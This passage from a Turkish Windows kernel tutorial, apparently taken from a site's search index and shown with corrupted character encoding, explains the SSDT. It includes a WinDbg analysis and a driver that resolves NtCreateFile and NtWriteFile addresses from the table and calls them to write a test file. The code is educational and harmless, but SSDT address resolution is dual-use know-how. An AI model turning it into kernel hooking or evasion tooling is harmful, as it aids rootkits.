aÃ§Ä±lÄ±yor?â€ diye dÃ¼ÅŸÃ¼nen olabilir. Bilmeyenler iÃ§in CreateFile fonksiyonu, Windows iÅŸletim sisteminde bir dosya veya aygÄ±t nesnesi oluÅŸturmak veya aÃ§mak iÃ§in kullanÄ±labilir. Daha fazla araÅŸtÄ±rma iÃ§in dÃ¶kÃ¼manlara bakabilirsiniz.\nStatus = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } Bu kÄ±sÄ±mda ise WriteFile fonksiyonu aracÄ±lÄ±ÄŸÄ±yla sÃ¼rÃ¼cÃ¼mÃ¼ze IRP isteÄŸi gÃ¶nderiyoruz.\nSÃ¼rÃ¼cÃ¼nÃ¼n ve ProgramÄ±n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± Ã–ncelikle sÃ¼rÃ¼cÃ¼mÃ¼zÃ¼ windbgâ€™a baÄŸlÄ± sanal makineye yÃ¼klememiz ve ardÄ±ndan baÅŸlatmamÄ±z gerekecek:\nÅimdi ise user mode programÄ±mÄ±zÄ± Ã§alÄ±ÅŸtÄ±ralÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi user mode programÄ±mÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda sÃ¼rÃ¼cÃ¼ye veri gÃ¶nderdiÄŸini ve gÃ¶nderilen veriyi ekrana yazdÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶rdÃ¼k:\nUser mode program tarafÄ±ndan MJ_WRITE IRP isteÄŸinin geldiÄŸini ve iÅŸlediÄŸini bÃ¶ylece gÃ¶rmÃ¼ÅŸ oluyoruz.\nSonuÃ§ Bu yazÄ±da IRPâ€™nin ne olduÄŸunu, nasÄ±l oluÅŸturulduÄŸunu ve nasÄ±l kullanÄ±ldÄ±ÄŸÄ±nÄ± Ã¶ÄŸrendik. AyrÄ±ca, IRPâ€™nin sÃ¼rÃ¼cÃ¼ler ve iÅŸletim sistemi arasÄ±nda nasÄ±l bir kÃ¶prÃ¼ gÃ¶revi gÃ¶rdÃ¼ÄŸÃ¼nÃ¼ de Ã¶ÄŸrendik. Bu konuda daha fazla bilgi edinmek isterseniz, Microsoft Docsâ€™ta bulunan kaynaklara gÃ¶z atabilirsiniz.\nUmarÄ±m faydalÄ± bir yazÄ± olmuÅŸtur. Ä°yi Ã§alÄ±ÅŸmalar dilerim ğŸš€ğŸš€ğŸš€\nReferences Microsoft Docs - I/O Request Packets ","sonuÃ§#SonuÃ§":"","sÃ¼rÃ¼cÃ¼nÃ¼n-ve-programÄ±n-Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±#SÃ¼rÃ¼cÃ¼nÃ¼n ve ProgramÄ±n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±":""},"title":"IRP"},"/tr/docs/winkernel-dev/wkd-ssdt/":{"data":{"":"","driverin-analiz-edilmesi#\u003cstrong\u003eDriver\u0026rsquo;in Analiz edilmesi\u003c/strong\u003e":"","kodlama#\u003cstrong\u003eKodlama\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar bu yazÄ±da System Service Descriptor Table inceleyeceÄŸiz.\nSSDT Nedir? BasitÃ§e SSDT (System Service Descriptor Table), iÅŸletim sistemi tarafÄ±ndan desteklenen sistem Ã§aÄŸrÄ±larÄ±nÄ±n bir listesidir. Sistem Ã§aÄŸrÄ±larÄ±, bir uygulamanÄ±n Ã§ekirdek seviyesindeki iÅŸlevleri kullanmasÄ± iÃ§in yapÄ±lan Ã§aÄŸrÄ±lardÄ±r.\nSSDT, Service Descriptor Table kernel bellek yapÄ±sÄ±nÄ±n ilk Ã¼yesidir:\ntypedef struct tagSERVICE_DESCRIPTOR_TABLE { SYSTEM_SERVICE_TABLE nt; // SSDT Tablosu kendisine etkili bir pointer SYSTEM_SERVICE_TABLE win32k; SYSTEM_SERVICE_TABLE sst3; SYSTEM_SERVICE_TABLE sst4; } SERVICE_DESCRIPTOR_TABLE; SSDT, sistem Ã§aÄŸrÄ±larÄ±nÄ± (syscall) Ã§ekirdek API adresleriyle eÅŸleÅŸtirir. Bir user-mode program tarafÄ±ndan bir sistem Ã§aÄŸrÄ±sÄ± yapÄ±ldÄ±ÄŸÄ±nda, bu Ã§aÄŸrÄ± bir hizmet indeksi (service index) iÃ§erir. Bu indeks, hangi sistem Ã§aÄŸrÄ±sÄ±nÄ±n kullanÄ±lacaÄŸÄ±nÄ± belirtir. Ä°ÅŸletim sistemi, bu indeksi kullanarak System Service Descriptor Table (SSDT) Ã¼zerinden ilgili iÅŸlevin adresini Ã§Ã¶zÃ¼mleyip ntoskrnl.exe iÃ§erisindeki doÄŸru Ã§ekirdek iÅŸlevine yÃ¶nlendirme yapar. KulaÄŸa kafa karÄ±ÅŸtÄ±cÄ± geliyor olabilir bir de diagram Ã¼zerinden anlatayÄ±m:\nDiyelim ki User-Mode alanÄ±ndan CreateFile iÅŸlevini Ã§aÄŸÄ±rdÄ±nÄ±z ve syscall numarasÄ± 0x2 olsun. Syscall yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼ zaman artÄ±k user-mode alanÄ±ndan Ã§Ä±kÄ±lÄ±r ve artÄ±k akÄ±ÅŸ kernel alanÄ±ndan devam eder. Diagramâ€™dan bunu gÃ¶rebilirsiniz.\nKernel alanÄ±na geÃ§iÅŸ yapÄ±ldÄ±ÄŸÄ±nda ilk durak SSDT (KiServiceTable) olacaktÄ±r. Burada tipik olarak Kernel Routine addressâ€™lere eriÅŸmek iÃ§in offset listesi barÄ±ndÄ±rdÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmenizi istiyorum. Ä°lgili syscall numarasÄ± ile offset hesaplanÄ±r ve ardÄ±ndan ilgili Routine Addressâ€™e yÃ¶nlendirilir. BÃ¶ylece NtCreateFile yÃ¼rÃ¼tÃ¼lmÃ¼ÅŸ olur. Hesaplama iÃ§in ise aÅŸaÄŸÄ±daki formÃ¼l kullanÄ±lÄ±r:\nOffset = KiServiceTableAddress + 4 * SSN Yani arkadaÅŸlar kÄ±sacasÄ± SSDT ve syscallâ€™lar, user-mode alanÄ±ndan gelen API Ã§aÄŸrÄ±larÄ±yla bunlara karÅŸÄ±lÄ±k gelen kernel routine adresler arasÄ±nda bir kÃ¶prÃ¼ gÃ¶revi gÃ¶rÃ¼r. Bu sayede kernel, user-mode alanÄ±ndan gelen bir sistem Ã§aÄŸrÄ±sÄ±na hangi iÅŸlevin yanÄ±t vereceÄŸini belirler.\nWindbg ile Analiz Konuyu teorik olarak bÄ±rakmak olmaz. Windbg ile bu SSDTâ€™ye bir gÃ¶z atalÄ±m:\nÃ‡Ä±ktÄ±da verilen ilk adres fffff800`798c7cb0, SSDTâ€™nin adresidir.\nSSDTâ€™nin bir tablo olduÄŸunu dÃ¼ÅŸÃ¼nmenizi istemiÅŸtim. Åimdi ise elde ettiÄŸimiz adresle tablodaki birkaÃ§ offsetâ€™e gÃ¶z atalÄ±m:\nTablodan ilk 5 offset gÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi sÄ±ralanmÄ±ÅŸ durumda. Åimdi bu offsetâ€™lerden 056b3400 alalÄ±m ve adresini hesaplayalÄ±m.\nEÄŸer Diagramâ€™a tekrar bakarsanÄ±z kernel routine adresine eriÅŸmek iÃ§in aÅŸaÄŸÄ±daki formÃ¼l kullanÄ±lÄ±yor:\nKernelRoutineAddress = KiServiceTableAddress + ( Offset \u003e\u003e\u003e 4 ) Åimdi Ã¶rnek olarak aldÄ±ÄŸÄ±mÄ±z offsetâ€™i bu formÃ¼l kullanarak routine adresine bir gÃ¶z atalÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi Ã¶rnek olarak aldÄ±ÄŸÄ±mÄ±z offset, NtWaitForSingleObjectâ€™e ait.\nSyscall ile Routine Adresi bulma Åimdi Syscall kullanarak Routine adresini nasÄ±l bulabiliriz buna bir bakalÄ±m.\nÃ–rnek olarak NtCreateFileâ€˜dan bahsetmiÅŸtim. Windbg ile bu APIâ€™a ait SSN numarasÄ±nÄ± ntdll.dllâ€˜den bulabiliriz:\neax registerâ€™a 0x55 deÄŸerinin aktarÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rÃ¼yoruz. Bu NtCreateFileâ€™in syscall numarasÄ±dÄ±r.\nÅimdi bu syscall numarasÄ±nÄ± kullanarak offsetâ€™i hesaplayÄ±p ardÄ±ndan routine adresine eriÅŸelim:\nÃ‡Ä±ktÄ±dan gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z Ã¼zere NtCreateFileâ€™in routine adresi fffff804`31a2d240 olduÄŸunu gÃ¶steriyor. YaptÄ±ÄŸÄ±mÄ±z bu adÄ±mlarÄ± kafamÄ±za daha iyi oturtmak iÃ§in ÅŸemasÄ±nÄ± tekrar oluÅŸturabiliriz:\nKodlama Ã–ÄŸrendiÄŸimiz ÅŸeyleri Kernel Driver kullanarak basitÃ§e kodlayalÄ±m.\nSenaryomuz ise NtCreateFile ve NtWriteFile APIâ€™larÄ±nÄ± kullanarak bir .txt dosyasÄ± oluÅŸturacaÄŸÄ±z ve iÃ§erisine bir metin yazdÄ±racaÄŸÄ±z ancak bu konuda Ã¶ÄŸrendiÄŸimiz ÅŸekillerle APIâ€™larÄ±n kernel routine adreslerini alÄ±p APIâ€™larÄ± direkt routine adresten Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z.\nProjenin github linki iÃ§in buraya tÄ±klayabilirsiniz.\n#pragma warning(disable: 4083 4005) #include \"main.h\" #define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 typedef (NTAPI* My_NtCreateFile)( _Out_ PHANDLE FileHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _Out_ PIO_STATUS_BLOCK IoStatusBlock, _In_opt_ PLARGE_INTEGER AllocationSize, _In_ ULONG FileAttributes, _In_ ULONG ShareAccess, _In_ ULONG CreateDisposition, _In_ ULONG CreateOptions, _In_reads_bytes_opt_(EaLength) PVOID EaBuffer, _In_ ULONG EaLength ); typedef (NTAPI* My_NtWriteFile)( IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, OUT PIO_STATUS_BLOCK IoStatusBlock, _In_reads_bytes_(Length) PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset OPTIONAL, IN PULONG Key OPTIONAL ); uint32_t ReadMemory(uint64_t Address) { return *(volatile uint32_t*)Address; } uint64_t GetAbsoluteAddress(int SSN, UNICODE_STRING APIName) { if (0 == SSN) { DbgPrintEx(0, 0, \"SSN is 0\\n\"); return 0; } DbgPrintEx(0, 0, \"Target API Name: %wZ\\n\", APIName); uint64_t RoutineAbsoluteAddress = 0; uint64_t OffsetAddress; uint32_t Offset = 0; // Offset'in adresini hesapla OffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); // Hesaplanan adresten offseti oku Offset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); // FormÃ¼lÃ¼ uygulayarak kernel routine adresine eri? RoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); return RoutineAbsoluteAddress; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = UnloadDriver; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status = STATUS_SUCCESS; uint64_t Address = 0; UNICODE_STRING FileName; UNICODE_STRING NtCreateFileName; UNICODE_STRING NtWriteFileName; UNICODE_STRING Data; RtlInitUnicodeString(\u0026NtCreateFileName, L\"NtCreateFile\"); RtlInitUnicodeString(\u0026NtWriteFileName, L\"NtWriteFile\"); RtlInitUnicodeString(\u0026FileName, L\"\\\\??\\\\C:\\\\ssdt.txt\"); RtlInitUnicodeString(\u0026Data, L\"Hello SSDT!\"); InitializeObjectAttributes(\u0026ObjAttr, \u0026FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);\t// NtCreateFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; // NtCreateFile'i Ã§aÄŸÄ±r Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); // NtWriteFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; // NtWriteFile'i Ã§aÄŸÄ±r Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); ZwClose(HandleFile); return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); return STATUS_SUCCESS; } Kodumuz bu ÅŸekilde. DetaylÄ±ca analiz etmeye baÅŸlayalÄ±m:\n#define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 Ä°lk olarak projede KiServiceTableâ€™in adresini ve iki APIâ€™in SSN numaralarÄ±nÄ± tanÄ±mlanmÄ±ÅŸtÄ±r. Bu projeyi Ã§alÄ±ÅŸtÄ±rÄ±rken aldÄ±ÄŸÄ±nÄ±z adresi ve SSN numaralarÄ±nÄ± buraya ekleyin.\n// NtCreateFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } DriverEntry iÃ§erisine gÃ¶z attÄ±ÄŸÄ±mÄ±zda ise tanÄ±mladÄ±ÄŸÄ±mÄ±z ve SSN numarasÄ± ve APIâ€™in ismini alan *GetAbsoluteAddress fonksiyonunu Ã§aÄŸÄ±rÄ±yoruz. Bu API ile burada anlattÄ±ÄŸÄ±m yÃ¶ntemler ile ilgili APIâ€™in kernel routine adresini alacaÄŸÄ±z.\n// Offset'in adresini hesapla OffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); GetAbsoluteAddress fonksiyonun iÃ§eriÄŸine baktÄ±ÄŸÄ±mÄ±zda ise SSDTâ€™nin iÃ§erisinden Offsetâ€™in adresini bulmak iÃ§in Ã¶nceden bahsettiÄŸim hesaplamayÄ± yapÄ±yoruz. Daha sonra elde ettiÄŸimiz offset adresini ekrana bastÄ±rÄ±yoruz.\n// Hesaplanan adresten offseti oku Offset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); Daha sonra aldÄ±ÄŸÄ±mÄ±z offsetâ€™in adresin iÃ§eriÄŸini okuyarak offsetâ€™i elde etmiÅŸ oluyoruz ve aynÄ± ÅŸekilde offsetâ€™i de ekrana bastÄ±rÄ±yoruz.\n// FormÃ¼lÃ¼ uygulayarak kernel routine adresine eriÅŸ RoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); Bu fonksiyonda son olarak ise formÃ¼lÃ¼ uygularak ilgili routine adresine eriÅŸmiÅŸ oluyoruz.\nMy_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); NtCreateFileâ€™in routine adresini aldÄ±ktan sonra ise oluÅŸturduÄŸumuz MyNtCreateFile yapÄ±sÄ±na bu adresi veriyoruz ve ardÄ±ndan routine adresini kullanarak NtCreateFile APIâ€™i Ã§aÄŸÄ±rÄ±yoruz.\n// NtWriteFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; // NtWriteFile'i Ã§aÄŸÄ±r Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); NtCreateFileâ€™i Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra yine aynÄ± iÅŸlemler ile NtWriteFileâ€™in routine adresini alÄ±yor ve oluÅŸturduÄŸumuz yapÄ±ya adresi veriyoruz ve ardÄ±ndan NtWriteFile APIâ€™i Ã§alÄ±ÅŸtÄ±rÄ±yoruz.\nDriverâ€™in Analiz edilmesi Tabi ki direkt olarak Driverâ€™i kodladÄ±ktan sonra direkt olarak sonucu gÃ¶stermek yerine sisteme yÃ¼kleyeceÄŸimiz Driverâ€™i adÄ±m adÄ±m takip edip neler yaptÄ±ÄŸÄ±na beraber bir gÃ¶z atalÄ±m. BÃ¶ylece kafamÄ±zda daha iyi yer edineceÄŸini dÃ¼ÅŸÃ¼nÃ¼yorum.\nÃ–ncelikle sanal makinemize baÄŸlÄ± Windbgâ€™a Driverâ€™Ä±mÄ±z iÃ§in bir breakpoint ekleyeceÄŸiz. BÃ¶ylece kodladÄ±ÄŸÄ±mÄ±z Driver sisteme yÃ¼klendiÄŸinde duracak.\nÄ°lk olarak sanal makineye hazÄ±rladÄ±ÄŸÄ±mÄ±z .sys dosyasÄ±nÄ± yÃ¼kleyelim:\nsc create SSDT binPath=\"C:\\Users\\bekoo\\Desktop\\SSDT.sys\" type=kernel start=demand Daha sonra Windbgâ€™a dÃ¶nÃ¼p bir breakpoint ekleyelim:\nbp SSDT!DriverEntry ArdÄ±ndan ise sÃ¼rÃ¼cÃ¼yÃ¼ Ã§alÄ±ÅŸtÄ±ralÄ±m:\nsc start SSDT Ã‡alÄ±ÅŸtÄ±rdÄ±ktan sonra Windbg ekranÄ±nda bp tetiklendiÄŸine dair bir Ã§Ä±ktÄ± almamÄ±z gerekiyor:\nElde ettiÄŸimiz adreslere gÃ¶z atmak iÃ§in GetAbsoluteAddress fonksiyonuna bir bp koyalÄ±m ve programÄ± devam ettirelim:\nkd\u003e bp SSDT!GetAbsoluteAddress\rkd\u003e g\rBreakpoint 1 hit\rSSDT!GetAbsoluteAddress:\rfffff802`333c12f0 4889542410 mov qword ptr [rsp+10h],rdx GetAbsoluteAddress fonksiyonunda durdu. Disassembly ekranÄ±nda GetAbsoluteAddress fonksiyonunu inceleyeceÄŸiz. Ä°lk duraÄŸÄ±mÄ±z Offsetâ€™in adresini hesapladÄ±ÄŸÄ±mÄ±z kÄ±sÄ±m olacak:\nÄ°lk olarak eax registerâ€™a fonksiyonun birinci parametresi olan SSN deÄŸiÅŸkenin deÄŸerini aktarÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmekteyiz. Program ilk defa GetAbsoluteAddress fonksiyonuna girdiÄŸi iÃ§in 0x55 yani NtCreateFileâ€™in ssn numarasÄ±nÄ± iÃ§erdiÄŸini biliyoruz.\nDaha sonra alÄ±nan SSN numarasÄ± shl eax,2 yani eaxâ€™Ä±n deÄŸerini 2 bit sola kaydÄ±rÄ±yor. Ne yaptÄ±ÄŸÄ±nÄ± anlamamÄ±z iÃ§in bu kÄ±smÄ±n formÃ¼lÃ¼ne tekrar hatÄ±rlayalÄ±m:\nOffset = KiServiceTableAddress + 4 * SSN Åimdi sunu sorabilirsiniz: â€œFormÃ¼lde Ã§arpma iÅŸlemi yapÄ±lÄ±yor ama arka planda 2 bit sola kaydÄ±rÄ±lÄ±yorâ€ diye.\nSola kaydÄ±rma (shift left, shl) iÅŸlemi, bir sayÄ±yÄ± 2â€™nin katlarÄ± ile Ã§arpmaya eÅŸdeÄŸerdir. Burada shl eax, 2 komutu ile eaxâ€™i 4 ile Ã§arpÄ±yor. Bunu doÄŸrulamak iÃ§in bu kÄ±sma bir breakpoint koyup eaxâ€™Ä±n ne sonuÃ§ aldÄ±ÄŸÄ±nÄ± gÃ¶rebiliriz:\nFotoÄŸrafta gÃ¶rÃ¼ndÃ¼ÄŸÃ¼ Ã¼zere shl eax,2 iÅŸlemini yapan kÄ±sma bir bp koyup akÄ±ÅŸÄ± burada durdurduÄŸumuzda eaxâ€™Ä±n Ã¶nceki ve iÅŸlemden sonraki deÄŸerini gÃ¶rebiliriz. Ã‡alÄ±ÅŸmadan Ã¶nce eaxâ€™Ä±n deÄŸeri 0x55 (Dec: 85) iken Ã§alÄ±ÅŸtÄ±ktan sonra 0x154 (Dec: 340) sonucu elde ediliyor.\nDaha sonra cdqe komutu ile eax registerâ€™Ä±ndaki deÄŸeri rax registerâ€™Ä± iÃ§in geniÅŸletiyor. Yani farklÄ± anlatÄ±m ile 32 bitlik deÄŸeri 64 bitâ€™e dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kullanÄ±lÄ±yor.\nBu formÃ¼lÃ¼n son kÄ±smÄ±nda ise rcxâ€™e KiServiceTableâ€™in adresi aktarÄ±lÄ±yor ve 4 * SSN sonucunu saklayan rax registerâ€™dan KiServiceTableAddressâ€™in deÄŸeri Ã§Ä±kartÄ±lÄ±yor. Åimdi burada kafanÄ±zÄ±nÄ±n yine karÄ±ÅŸtÄ±ÄŸÄ±nÄ±n farkÄ±ndayÄ±m.\nBurada tipik olarak her ne kadar da sub kullanÄ±larak Ã§Ä±kartma iÅŸlemi yapÄ±lÄ±yor olsa da raxâ€™tan rcx deÄŸerini Ã§Ä±kardÄ±ÄŸÄ±na dikkat edin. Yani farklÄ± bir deyiÅŸle bu, KiServiceTableAddressâ€™in raxâ€™tan Ã§Ä±karÄ±lmasÄ± anlamÄ±na gelir. Yani bu iÅŸlem KiServiceTableAddress + 4 * SSN iÅŸlemi ile aynÄ± sonucu verecektir. KafanÄ±zÄ±n karÄ±ÅŸtÄ±ÄŸÄ±nÄ±n farkÄ±ndayÄ±m ancak kÄ±saca ÅŸunu aklÄ±nÄ±zda tutabilirsiniz ki yaptÄ±rmak istediÄŸimiz formÃ¼l ile aynÄ± sonucu verecektir.\nOffsetâ€™in adresini gÃ¶rmek iÃ§in ise mov qword ptr [OffsetAddress (rsp+40h)], rax kÄ±smÄ±na karÅŸÄ±lÄ±k gelen adrese bir bp koyalÄ±m ve programÄ± devam ettirelim. Elde ettiÄŸimiz adrese bir gÃ¶z atalÄ±m:\nAdres olarak fffff8046a6c7e04 alÄ±ndÄ±ÄŸÄ±nÄ± gÃ¶rmekteyiz. YukarÄ±da zaten NtCreateFile ile Ã¶rnek yapmÄ±ÅŸtÄ±k yani adresler uyuÅŸuyor. DoÄŸru adresi aldÄ±ÄŸÄ±ndan emin olabiliriz.\nSon duraÄŸÄ±mÄ±z ise Routine adresini hesapladÄ±ÄŸÄ±mÄ±z formÃ¼l kÄ±smÄ± olacak.\nSSDTâ€™ten NtCreateFileâ€™in offset alÄ±ndÄ±ktan sonra eaxâ€™a offset deÄŸeri veriliyor ve ardÄ±ndan 4 bit saÄŸ kaydÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶rÃ¼yoruz. Bu formÃ¼lÃ¼mÃ¼zÃ¼n bir parÃ§asÄ±.\nDaha sonra rcxâ€™e KiServiceTableâ€™in adresi veriliyor ve ardÄ±ndan raxâ€™tan rcxâ€™i Ã§Ä±kardÄ±ÄŸÄ±nÄ± (yukarÄ±da bahsettiÄŸim gibi kafanÄ±z karÄ±ÅŸmasÄ±n bunu toplama yapÄ±yormuÅŸ gibi dÃ¼ÅŸÃ¼nelim) gÃ¶rmekteyiz. BÃ¶ylece NtCreateFileâ€™in routine adresine eriÅŸmiÅŸ oluyoruz. Elde edilen adrese gÃ¶z atalÄ±m:\nGÃ¶rÃ¼ndÃ¼ÄŸÃ¼ gibi baÅŸarÄ±lÄ± bir ÅŸekilde fffff8046ac2d240 sonucunu elde ediyoruz. Åimdi ise DriverEntryâ€™de routine adresine yÃ¶nlendirdiÄŸimiz kÄ±sÄ±ma dÃ¶nelim:\nGetAbsoluteAddress Ã§alÄ±ÅŸtÄ±ktan sonra alÄ±nan adresi oluÅŸturduÄŸumuz MyNtCreateFile yapÄ±sÄ±na aktarÄ±ldÄ±ÄŸÄ±nÄ± ve NtCreateFile iÃ§in parametrelerin hazÄ±rlandÄ±ÄŸÄ±nÄ± ve en sonda routine adrese yÃ¶nlendirildiÄŸini gÃ¶rebiliriz. Routine adresin Ã§aÄŸÄ±rÄ±ldÄ±ÄŸÄ± yere breakpoint koyup akÄ±ÅŸÄ± nereye yÃ¶nlendirdiÄŸine bir bakalÄ±m:\ncall yapÄ±ldÄ±ÄŸÄ± kÄ±sma bir breakpoint koyup raxâ€™Ä±n deÄŸerine baktÄ±ÄŸÄ±mÄ±zda elde ettiÄŸimiz NtCreateFileâ€™in routine adresi olduÄŸunu ve devam ettirdiÄŸimizde raxâ€™Ä±n adresine atlayan bir komut Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yor ve akÄ±ÅŸ NtCreateFile iÃ§erisine giderek devam ediyor.\nDriverâ€™in devamÄ±ndaki kodlar aynÄ± adÄ±mÄ± iÃ§erdiÄŸi iÃ§in driverâ€™i devam ettirebiliriz. Devam ettirmeden Ã¶nce breakpointâ€™leri kaldÄ±ralim ve ardÄ±ndan g komutuyla devam ettirelim:\nAkÄ±ÅŸÄ±n devamÄ±nda ise NtWriteFile APIâ€™si iÃ§in offset deÄŸeri ve routine adresini de gÃ¶rebiliriz.\nSon olarak ise gerÃ§ekten bir .txt oluÅŸturulmuÅŸ ve iÃ§erisine veri yazÄ±lmÄ±ÅŸ mÄ± buna bakalÄ±m:\nBaÅŸarÄ±lÄ± bir ÅŸekilde C:\\ssdt.txt oluÅŸturulduÄŸunu ve iÃ§erisine â€˜Hello SSDT!â€™ metni yazdÄ±rÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rebiliriz.\nSonuÃ§ SonuÃ§ olarak, bu yazÄ±da SSDTâ€™nin WinDbg ortamÄ±nda analizini gerÃ§ekleÅŸtirdik ve elde ettiÄŸimiz bulgularÄ± kodlamaya dÃ¶ktÃ¼k. Kodlama aÅŸamasÄ±nda, Ã¶ÄŸrendiÄŸimiz formÃ¼ller ile NtCreateFile ve NtWriteFileâ€™in routine adreslerini hesapladÄ±k. Bu adresleri kullanarak bir .txt dosyasÄ± oluÅŸturduk ve iÃ§erisine metin yazdÄ±k. Son olarak ise windbgâ€™da kodladÄ±ÄŸÄ±mÄ±z driverâ€™i analiz etmiÅŸ olduk.\nUmarÄ±m bu konu sizler iÃ§in faydalÄ± olmuÅŸtur. Konu, ilk bakÄ±ÅŸta kafa karÄ±ÅŸtÄ±rÄ±cÄ± gibi gÃ¶rÃ¼nebilir; ancak teoride kalmamasÄ± ve daha iyi anlaÅŸÄ±labilmesi iÃ§in detaylarÄ± mÃ¼mkÃ¼n olduÄŸunca aÃ§Ä±klamaya Ã§alÄ±ÅŸtÄ±m.\nHepinize iyi Ã§alÄ±ÅŸmalar dilerim!\nReferences iRedTeam Notes - SSDT\nWikipedia - System Service Descriptor Table","sonuÃ§#\u003cstrong\u003eSonuÃ§\u003c/strong\u003e":"","ssdt-nedir#\u003cstrong\u003eSSDT Nedir?\u003c/strong\u003e":"","syscall-ile-routine-adresi-bulma#\u003cstrong\u003eSyscall ile Routine Adresi bulma\u003c/strong\u003e":"","windbg-ile-analiz#\u003cstrong\u003eWindbg ile Analiz\u003c/strong\u003e":""},"title":"SSDT"},"/tr/docs/winkernel-dev/wkd-virtual-memory/":{"data":{"":"","code#Code":"","references#References":"Merhabalar, bu yazÄ±da Virtual Memory konusunu ele alacaÄŸÄ±m.\nVirtual Memory Nedir? â€œWindows, her bir process iÃ§in, bÃ¼yÃ¼k ve Ã¶zel bir adres alanÄ±na sahipmiÅŸ gibi gÃ¶rÃ¼nen bir sanal bellek sistemi kullanÄ±r. Sanal bellek, gerÃ§ek fiziksel belleÄŸin 